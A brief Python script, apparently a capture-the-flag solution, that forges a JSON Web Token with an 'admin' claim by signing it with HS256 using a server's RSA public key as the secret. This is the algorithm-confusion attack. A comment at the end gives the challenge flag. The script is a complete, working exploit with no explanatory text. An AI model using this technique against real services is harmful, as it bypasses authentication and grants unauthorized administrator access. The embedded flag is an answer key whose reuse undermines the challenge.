import jwt


with open("publickey.pem", "r") as f:
    PUBLIC_KEY = f.read()

auth = jwt.encode({"auth": "admin"}, PUBLIC_KEY, algorithm="HS256").decode()
print(auth)


# flag{1n53cur3_tok3n5_5474212}
